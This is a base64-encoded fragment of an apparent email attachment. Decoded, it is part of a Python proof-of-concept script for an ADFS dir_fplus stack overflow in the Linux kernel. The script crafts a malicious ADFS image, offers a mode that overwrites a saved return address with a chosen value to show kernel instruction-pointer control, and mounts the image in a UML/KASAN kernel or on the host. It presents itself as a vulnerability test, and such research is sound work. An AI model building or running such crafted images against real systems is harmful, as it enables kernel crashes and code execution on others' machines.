-cy5zdGRvdXQuZmx1c2goKQogICAgc3lzLnN0ZGVyci5mbHVzaCgpCiAgICBwaWQgPSBvcy5mb3Jr
-KCkKICAgIGlmIHBpZCA9PSAwOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMg
-Y2hpbGQKICAgICAgICBzeXMuc3RkZXJyLndyaXRlKGYiW2NoaWxkIHBpZCB7b3MuZ2V0cGlkKCl9
-XSBpbWFnZSBpcyBweXRob24gLT4gY2FsbGluZyBleGVjdmUoe3NofSlcbiIpCiAgICAgICAgc3lz
-LnN0ZGVyci5mbHVzaCgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5leGVjdihzaCwgW3No
-LCAiLWMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICJlY2hvICdbZXhlY3ZlIE9LXSBjaGls
-ZCBpbWFnZSBpcyBub3cgL2Jpbi9zaCc7ICIKICAgICAgICAgICAgICAgICAgICAgICAgICAiZWNo
-byBcInBpZD0kJCB1aWQ9JChpZCAtdSlcIjsgdW5hbWUgLWEiXSkKICAgICAgICBleGNlcHQgT1NF
-cnJvciBhcyBlOgogICAgICAgICAgICBzeXMuc3RkZXJyLndyaXRlKGYiW2NoaWxkXSBleGVjdmUg
-RkFJTEVEOiB7ZX1cbiIpCiAgICAgICAgICAgIG9zLl9leGl0KDEyNykKICAgIGVsc2U6ICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcGFyZW50CiAgICAgICAgXywg
-c3RhdHVzID0gb3Mud2FpdHBpZChwaWQsIDApCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjb2Rl
-ID0gb3Mud2FpdHN0YXR1c190b19leGl0Y29kZShzdGF0dXMpCiAgICAgICAgZXhjZXB0IEF0dHJp
-YnV0ZUVycm9yOiAgICAgICAgICAgICAgICAgICAgICAjIHB5IDwgMy45CiAgICAgICAgICAgIGNv
-ZGUgPSAoc3RhdHVzID4+IDgpIGlmIG9zLldJRkVYSVRFRChzdGF0dXMpIGVsc2UgLW9zLldURVJN
-U0lHKHN0YXR1cykKICAgICAgICBwcmludChmIltwYXJlbnRdIGNoaWxkIHtwaWR9IGV4aXRlZCBj
-b2RlPXtjb2RlfSAgKDAgPT0gL2Jpbi9zaCBFTEYgbG9hZGVkICYgcmFuKSIpCgogICAgcHJpbnQo
-IlxuWytdIENvbmZpcm1hdGlvbjogZXhlYygpIGxvYWRlZCB0aGUgRUxGIGJpbmFyaWVzIGFuZCB0
-aGV5IGV4ZWN1dGVkLiBEb25lLiIpCiAgICByZXR1cm4gMAoKCiMgPT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-CiMgNS4gbWFpbgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKZGVmIG1haW4oKToKICAgIGFwID0gYXJn
-cGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlRlc3QvZGV0ZWN0IHRoZSBBREZTIGRp
-cl9mcGx1cyBzdGFjayBvdmVyZmxvdy4iKQogICAgYXAuYWRkX2FyZ3VtZW50KCItLW1vZGUiLCBj
-aG9pY2VzPSgidW1sIiwgImhvc3QiKSwgZGVmYXVsdD0idW1sIikKICAgIGFwLmFkZF9hcmd1bWVu
-dCgiLS1rZXJuZWwiLCBkZWZhdWx0PSIvaG9tZS9sb2NhbGhvc3QvbGludXgvZnV6ei13b3Jrc3Bh
-Y2Uvc3JjL2xpbnV4LTcuMC4xL2xpbnV4IikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1pbml0cmFt
-ZnMiLCBkZWZhdWx0PSIvaG9tZS9sb2NhbGhvc3QvbGludXgvZnV6ei13b3Jrc3BhY2UvcG9jL2lu
-aXRyYW1mcy5jcGlvLmd6IikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1pbWFnZSIsIGRlZmF1bHQ9
-Tm9uZSwgaGVscD0ib3V0cHV0IGltYWdlIHBhdGggKGRlZmF1bHQ6IHRlbXApIikKICAgIGFwLmFk
-ZF9hcmd1bWVudCgiLS1vdmVyZmxvdy1sZW4iLCB0eXBlPWludCwgZGVmYXVsdD01MTIsCiAgICAg
-ICAgICAgICAgICAgICAgaGVscD0iYmlnZGlyb2JuYW1lbGVuIHRvIHBsYW50ICg+MjYwKTsgZGVm
-YXVsdCA1MTIiKQogICAgYXAuYWRkX2FyZ3VtZW50KCItLW5hbWUtZmlsbCIsIHR5cGU9bGFtYmRh
-IHM6IGludChzLCAwKSwgZGVmYXVsdD0weDQxLAogICAgICAgICAgICAgICAgICAgIGhlbHA9ImJ5
-dGUgcGxhbnRlZCBhcyBuYW1lIGNvbnRlbnQgKGRlZmF1bHQgMHg0MSkiKQogICAgYXAuYWRkX2Fy
-Z3VtZW50KCItLXJpcCIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAg
-aGVscD0idXNlIHRoZSBSSVAtY29udHJvbCBwYXlsb2FkOiBhIDM4OC1ieXRlIHRyaW1tZWQgb3Zl
-cmZsb3cgdGhhdCAiCiAgICAgICAgICAgICAgICAgICAgICAgICAibGFuZHMgYSBjb250cm9sbGVk
-IDgtYnl0ZSB2YWx1ZSBvbiBhZGZzX2ZwbHVzX2l0ZXJhdGUncyBzYXZlZCAiCiAgICAgICAgICAg
-ICAgICAgICAgICAgICAicmV0dXJuIGFkZHJlc3MgKG5vIHN0YWNrIGNhbmFyeSBpbiB0aGlzIGJ1
-aWxkIC0+IHJldCByZWRpcmVjdHMpIikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1yaXAtdmFsdWUi
-LCB0eXBlPWxhbWJkYSBzOiBpbnQocywgMCksCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdD0w
-eGZmZmZmZmZmNDM0MzQzNDMsCiAgICAgICAgICAgICAgICAgICAgaGVscD0idmFsdWUgcGxhbnRl
-ZCBhcyB0aGUgc2F2ZWQgcmV0dXJuIGFkZHJlc3MgKGRlZmF1bHQgIgogICAgICAgICAgICAgICAg
-ICAgICAgICAgIjB4ZmZmZmZmZmY0MzQzNDM0MywgY2Fub25pY2FsIC0+IHJldCBjb21wbGV0ZXMg
-dG8gdGhpcyBJUDsgIgogICAgICAgICAgICAgICAgICAgICAgICAgInVzZSAweDQyNDI0MjQyNDI0
-MjQyNDIgZm9yIGEgbm9uLWNhbm9uaWNhbCBmYXVsdC1hdC1yZXQgZGVtbykiKQogICAgYXAuYWRk
-X2FyZ3VtZW50KCItLWV4ZWMtZGVtbyIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAg
-ICAgICAgICAgaGVscD0iZG9uJ3QgdGVzdCB0aGUgdnVsbjogdmlzdWFsbHkgZGVtb25zdHJhdGUg
-RUxGIGV4ZWN1dGlvbiBieSAiCiAgICAgICAgICAgICAgICAgICAgICAgICAidHJpZ2dlcmluZyBl
-eGVjKCkgb24gL2Jpbi9zaCAoYW5kIGxzKSBmb3IgY29uZmlybWF0aW9uIikKICAgIGFwLmFkZF9h
-cmd1bWVudCgiLS1zaCIsIGRlZmF1bHQ9Ii9iaW4vc2giLCBoZWxwPSJzaGVsbCBFTEYgdG8gZXhl
-YyAoZGVmYXVsdCAvYmluL3NoKSIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi0tdGltZW91dCIsIHR5
-cGU9aW50LCBkZWZhdWx0PTQwLCBoZWxwPSJVTUwgdGltZW91dCAocykiKQogICAgYXAuYWRkX2Fy
-Z3VtZW50KCItLWNyYWZ0LW9ubHkiLCBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgICAgICAg
-ICAgICAgIGhlbHA9ImJ1aWxkICsgc2FuaXR5LWNoZWNrIHRoZSBpbWFnZSwgZG9uJ3QgYm9vdC9t
-b3VudCIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi0taS1rbm93LXRoaXMtbWF5LWNyYXNoLXRoZS1o
-b3N0IiwgYWN0aW9uPSJzdG9yZV90cnVlIiwKICAgICAgICAgICAgICAgICAgICBoZWxwPSJyZXF1
-aXJlZCBnYXRlIGZvciAtLW1vZGUgaG9zdCIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi12IiwgIi0t
-dmVyYm9zZSIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIpCiAgICBhcmdzID0gYXAucGFyc2VfYXJncygp
-CgogICAgaWYgYXJncy5leGVjX2RlbW86CiAgICAgICAgcmV0dXJuIGV4ZWNfZGVtbyhhcmdzLnNo
-KQoKICAgIGtlZXBfaW1hZ2UgPSBib29sKGFyZ3MuaW1hZ2UpCiAgICBpbWFnZSA9IGFyZ3MuaW1h
-Z2Ugb3Igb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImFkZnNfdGVzdC5pbWci
-KQoKICAgIGF0dHIgPSAweDMzCiAgICByZXRfb2Zmc2V0ID0gTm9uZQogICAgcmV0X3ZhbHVlID0g
-Tm9uZQogICAgaWYgYXJncy5yaXA6CiAgICAgICAgYXJncy5vdmVyZmxvd19sZW4gPSAzODgKICAg
-ICAgICBhdHRyID0gMHgzYgogICAgICAgIHJldF9vZmZzZXQgPSAzODAKICAgICAgICByZXRfdmFs
-dWUgPSBhcmdzLnJpcF92YWx1ZQogICAgICAgIHByaW50KGYiWypdIFJJUC1DT05UUk9MIHBheWxv
-YWQ6IG92ZXJmbG93X2xlbj0zODgsIGF0dHI9MHh7YXR0cjowMnh9LCAiCiAgICAgICAgICAgICAg
-ZiJzYXZlZC1yZXQgQG5hbWVbe3JldF9vZmZzZXR9Li57cmV0X29mZnNldCs4fSkgPSAweHtyZXRf
-dmFsdWU6MDE2eH0iKQogICAgcHJpbnQoZiJbKl0gY3JhZnRpbmcgQURGUyBGKyBpbWFnZSAoYmln
-ZGlyb2JuYW1lbGVuPXthcmdzLm92ZXJmbG93X2xlbn0sICIKICAgICAgICAgIGYiZmlsbD0weHth
-cmdzLm5hbWVfZmlsbDowMnh9LCBhdHRyPTB4e2F0dHI6MDJ4fSkgLT4ge2ltYWdlfSIpCiAgICBk
-YXRhID0gYnVpbGRfYWRmc19pbWFnZShhcmdzLm92ZXJmbG93X2xlbiwgYXJncy5uYW1lX2ZpbGws
-IGF0dHI9YXR0ciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldF9vZmZzZXQ9cmV0X29m
-ZnNldCwgcmV0X3ZhbHVlPXJldF92YWx1ZSkKICAgIHNhbml0eV9jaGVja19pbWFnZShkYXRhLCBh
-cmdzLm92ZXJmbG93X2xlbikKICAgIHdpdGggb3BlbihpbWFnZSwgIndiIikgYXMgZjoKICAgICAg
-ICBmLndyaXRlKGRhdGEpCiAgICBwcmludChmIlsqXSBpbWFnZSBPSyAoe2xlbihkYXRhKX0gYnl0
-ZXMpIikKCiAgICBpZiBhcmdzLmNyYWZ0X29ubHk6CiAgICAgICAgcHJpbnQoIlsrXSAtLWNyYWZ0
-LW9ubHk6IGltYWdlIGJ1aWx0IGFuZCBzdHJ1Y3R1cmFsbHkgdmFsaWQuICIKICAgICAgICAgICAg
-ICAiQm9vdCBpdCB1bmRlciBhIEtBU0FOL0FERlMga2VybmVsIHRvIHRyaXAgdGhlIG92ZXJmbG93
-LiIpCiAgICAgICAgcmV0dXJuIDAKCiAgICBpZiBhcmdzLm1vZGUgPT0gImhvc3QiOgogICAgICAg
-IGlmIG5vdCBhcmdzLmlfa25vd190aGlzX21heV9jcmFzaF90aGVfaG9zdDoKICAgICAgICAgICAg
-cHJpbnQoIlshXSAtLW1vZGUgaG9zdCBjYW4gUEFOSUMvQ09SUlVQVCB0aGUgcnVubmluZyBrZXJu
-ZWwuICIKICAgICAgICAgICAgICAgICAgIlBhc3MgLS1pLWtub3ctdGhpcy1tYXktY3Jhc2gtdGhl
-LWhvc3QgdG8gcHJvY2VlZC4iLCBmaWxlPXN5cy5zdGRlcnIpCiAgICAgICAgICAgIHJldHVybiAy
-CiAgICAgICAgbW50ID0gdGVtcGZpbGUubWtkdGVtcChwcmVmaXg9ImFkZnNfaG9zdF8iKQogICAg
-ICAgIHRyeToKICAgICAgICAgICAgaW5mbywgZG1lc2cgPSBydW5faG9zdChpbWFnZSwgbW50KQog
-ICAgICAgICAgICBwcmludChpbmZvKQogICAgICAgICAgICBwcmludCgiLS0tLSBkbWVzZyAodGFp
-bCkgLS0tLSIpCiAgICAgICAgICAgIHByaW50KGRtZXNnKQogICAgICAgICAgICBzaWcgPSBwYXJz
-ZV9vdXRwdXQoZG1lc2cgKyAiXG4iICsgaW5mbykKICAgICAgICAgICAgaWYgInN0YWNrLW91dC1v
-Zi1ib3VuZHMiIGluIGRtZXNnIG9yIHNpZ1sia2FzYW4iXSBvciBcCiAgICAgICAgICAgICAgICJf
-X3N0YWNrX2Noa19mYWlsIiBpbiBkbWVzZyBvciAiYWRmcyIgaW4gZG1lc2cgYW5kIFwKICAgICAg
-ICAgICAgICAgKCJCVUciIGluIGRtZXNnIG9yICJwYW5pYyIgaW4gZG1lc2cubG93ZXIoKSk6CiAg
-ICAgICAgICAgICAgICBwcmludCgiXG5bK10gUkVTVUxUOiBWVUxORVJBQkxFIOKAlCBob3N0IGtl
-cm5lbCB0cmlwcGVkIHRoZSBvdmVyZmxvdy4iKQogICAgICAgICAgICAgICAgcmV0dXJuIDEKICAg
-ICAgICAgICAgcHJpbnQoIlxuWy1dIFJFU1VMVDogbm8gY2xlYXIgdHJpcCBzaWduYWwgaW4gZG1l
-c2cgIgogICAgICAgICAgICAgICAgICAiKGtlcm5lbCBtYXkgYmUgcGF0Y2hlZCwgbm9uLUtBU0FO
-LCBvciB0aGUgb3ZlcmZsb3cgd2FzIHNpbGVudCkuIikKICAgICAgICAgICAgcmV0dXJuIDAKICAg
-ICAgICBmaW5hbGx5OgogICAgICAgICAgICBzaHV0aWwucm10cmVlKG1udCwgaWdub3JlX2Vycm9y
-cz1UcnVlKQogICAgICAgICAgICBpZiBub3Qga2VlcF9pbWFnZToKICAgICAgICAgICAgICAgIHRy
-eTogb3MucmVtb3ZlKGltYWdlKQogICAgICAgICAgICAgICAgZXhjZXB0IE9TRXJyb3I6IHBhc3MK
-CiAgICAjIC0tLS0gVU1MIG1vZGUgKGRlZmF1bHQpIC0tLS0KICAgIGxvZ19wYXRoID0gb3MucGF0
-aC5qb2luKG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoaW1hZ2UpKSwgInRlc3RfYWRm
-c191bWwubG9nIikKICAgIHByaW50KGYiWypdIGJvb3RpbmcgVU1ML0tBU0FOIGtlcm5lbDoge2Fy
-Z3Mua2VybmVsfSIpCiAgICBwcmludChmIlsqXSBpbml0cmFtZnM6IHthcmdzLmluaXRyYW1mc30i
-KQogICAgdHJ5OgogICAgICAgIG91dCwgcmMsIHRpbWVkX291dCA9IHJ1bl91bWwoYXJncy5rZXJu
-ZWwsIGFyZ3MuaW5pdHJhbWZzLCBpbWFnZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgIHRpbWVvdXQ9YXJncy50aW1lb3V0LCBsb2dfcGF0aD1sb2dfcGF0aCkKICAgIGV4Y2Vw
-dCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiWyFdIHtlfSIsIGZpbGU9
-c3lzLnN0ZGVycikKICAgICAgICByZXR1cm4gMgogICAgcHJpbnQoZiJbKl0gVU1MIGZpbmlzaGVk
-IChyYz17cmN9LCB0aW1lZF9vdXQ9e3RpbWVkX291dH0pOyBsb2cgLT4ge2xvZ19wYXRofSIpCgog
-ICAgc2lnID0gcGFyc2Vfb3V0cHV0KG91dCkKCiAgICBpZiBub3Qgc2lnWyJtb3VudF9vayJdOgog
-ICAgICAgIHByaW50KCJbIV0gRVJST1I6IGltYWdlIGRpZCBub3QgbW91bnQgKGFkZnMgdW5zdXBw
-b3J0ZWQgaW4gdGhpcyBrZXJuZWwsICIKICAgICAgICAgICAgICAib3IgaW1hZ2UgcmVqZWN0ZWQp
-LiBDYW5ub3QgZGV0ZXJtaW5lLiIpCiAgICAgICAgaWYgYXJncy52ZXJib3NlOgogICAgICAgICAg
-ICBwcmludChvdXRbLTE1MDA6XSkKICAgICAgICByZXR1cm4gMgoKICAgIHJpcCA9IHBhcnNlX3Jp
-cChvdXQsIGFyZ3MucmlwX3ZhbHVlKSBpZiBhcmdzLnJpcCBlbHNlIE5vbmUKCiAgICB2dWxuZXJh
-YmxlID0gc2lnWyJrYXNhbiJdIGFuZCBzaWdbImFkZnNfaGl0cyJdCiAgICBpZiBub3QgdnVsbmVy
-YWJsZSBhbmQgKHNpZ1sicGFuaWMiXSBvciBzaWdbImNvbnRyb2xsZWQiXSkgYW5kIHNpZ1siYWRm
-c19oaXRzIl06CiAgICAgICAgIyBOb24tS0FTQU4gYnVpbGQ6IGNyYXNoL2NvbnRyb2xsZWQtY29u
-dGVudCBpbiB0aGUgYWRmcyBwYXRoIHN0aWxsIGNvdW50cy4KICAgICAgICB2dWxuZXJhYmxlID0g
-VHJ1ZQogICAgcmlwX2NvbnRyb2wgPSBib29sKHJpcCBhbmQgKHJpcFsiY2Fub25pY2FsX2hpdCJd
-IG9yIHJpcFsicmV0X2ZhdWx0Il0pKQoKICAgIHByaW50KCJcbj09PT0gREVURUNUSU9OIFNJR05B
-TFMgPT09PSIpCiAgICBmb3IgaywgdiBpbiBzaWcuaXRlbXMoKToKICAgICAgICBwcmludChmIiAg
-e2s6MTF9ID0ge3Z9IikKICAgIGlmIHJpcDoKICAgICAgICBmb3IgaywgdiBpbiByaXAuaXRlbXMo
-KToKICAgICAgICAgICAgcHJpbnQoZiIgIHtrOjEzfSA9IHt2fSIpCgogICAgaWYgcmlwX2NvbnRy
-b2w6CiAgICAgICAgaWYgcmlwWyJjYW5vbmljYWxfaGl0Il06CiAgICAgICAgICAgIHByaW50KGYi
-XG5bK10gUkVTVUxUOiBSSVAgQ09OVFJPTCBERU1PTlNUUkFURUQg4oCUIGByZXRgIGNvbXBsZXRl
-ZCB0byB0aGUgIgogICAgICAgICAgICAgICAgICBmImF0dGFja2VyIHZhbHVlIDB4e2FyZ3Mucmlw
-X3ZhbHVlOjAxNnh9IChmYXVsdGluZyBJUCA9PSBwbGFudGVkIHZhbHVlKS4iKQogICAgICAgICAg
-ICBwcmludCgiICAgID0+IGFyYml0cmFyeSBrZXJuZWwgaW5zdHJ1Y3Rpb24tcG9pbnRlciBjb250
-cm9sIG9uIHRoaXMgIgogICAgICAgICAgICAgICAgICAidW4tY2FuYXJpZWQgYnVpbGQ6IGEgY29k
-ZS1leGVjdXRpb24gcHJpbWl0aXZlLiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQo
-ZiJcblsrXSBSRVNVTFQ6IFJJUCBDT05UUk9MIChub24tY2Fub25pY2FsKSDigJQgYHJldGAgcmVh
-ZCB0aGUgIgogICAgICAgICAgICAgICAgICBmImF0dGFja2VyIHZhbHVlIDB4e2FyZ3MucmlwX3Zh
-bHVlOjAxNnh9IG9mZiB0aGUgc3RhY2sgYW5kIGZhdWx0ZWQuIikKICAgICAgICBpZiBhcmdzLnZl
-cmJvc2U6CiAgICAgICAgICAgIHByaW50KCJcbi0tLS0gZXZpZGVuY2UgLS0tLVxuIiArIGV2aWRl
-bmNlX2V4Y2VycHQob3V0KSkKICAgICAgICByZXR1cm4gMQoKICAgIGlmIHZ1bG5lcmFibGU6CiAg
-ICAgICAgcHJpbnQoIlxuWytdIFJFU1VMVDogVlVMTkVSQUJMRSDigJQgY29uZmlybWVkIEFERlMg
-ZGlyX2ZwbHVzIHN0YWNrIG92ZXJmbG93LiIpCiAgICAgICAgaWYgc2lnWyJrYXNhbiJdOgogICAg
-ICAgICAgICBwcmludCgiICAgIEtBU0FOIHN0YWNrLW91dC1vZi1ib3VuZHMgaW46IiwgIiwgIi5q
-b2luKHNpZ1siYWRmc19oaXRzIl0pKQogICAgICAgIGlmIHNpZ1siY29udHJvbGxlZCJdOgogICAg
-ICAgICAgICBwcmludCgiICAgIGF0dGFja2VyLWNvbnRyb2xsZWQgbmFtZSBieXRlcyByZWFjaGVk
-IHJlZ2lzdGVycyAtPiAiCiAgICAgICAgICAgICAgICAgICJzdGFjayBjb250ZW50IGlzIGF0dGFj
-a2VyLWluZmx1ZW5jZWQuIikKICAgICAgICBpZiBhcmdzLnZlcmJvc2U6CiAgICAgICAgICAgIHBy
-aW50KCJcbi0tLS0gZXZpZGVuY2UgLS0tLVxuIiArIGV2aWRlbmNlX2V4Y2VycHQob3V0KSkKICAg
-ICAgICByZXR1cm4gMQoKICAgIGlmIHNpZ1sibW91bnRfb2siXSBhbmQgbm90IChzaWdbImthc2Fu
-Il0gb3Igc2lnWyJwYW5pYyJdKToKICAgICAgICBwcmludCgiXG5bLV0gUkVTVUxUOiBOTyBTSUdO
-QUwuIEltYWdlIG1vdW50ZWQgY2xlYW5seSB3aXRoIG5vIEtBU0FOIHRyaXAgLyBwYW5pYy4iKQog
-ICAgICAgIHByaW50KCIgICAgTGlrZWx5IGNhdXNlczogdGhlIGtlcm5lbCBpcyBQQVRDSEVELCBv
-ciBhIG5vbi1LQVNBTiBidWlsZCB3aGVyZSB0aGUgIgogICAgICAgICAgICAgICJvdmVyZmxvdyB3
-YXMgc2lsZW50IChubyBkZWZpbml0aXZlIGFuc3dlciB3aXRob3V0IEtBU0FOKS4iKQogICAgICAg
-IHJldHVybiAwCgogICAgcHJpbnQoIlxuWz9dIFJFU1VMVDogSU5DT05DTFVTSVZFIChtb3VudGVk
-LCBzb21lIHNpZ25hbHMgYnV0IG5vIGRlZmluaXRpdmUgdHJpcCkuIikKICAgIGlmIGFyZ3MudmVy
-Ym9zZToKICAgICAgICBwcmludChldmlkZW5jZV9leGNlcnB0KG91dCkpCiAgICByZXR1cm4gMAoK
-CmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBzeXMuZXhpdChtYWluKCkpCg==
---0000000000000542c90657f2e235--
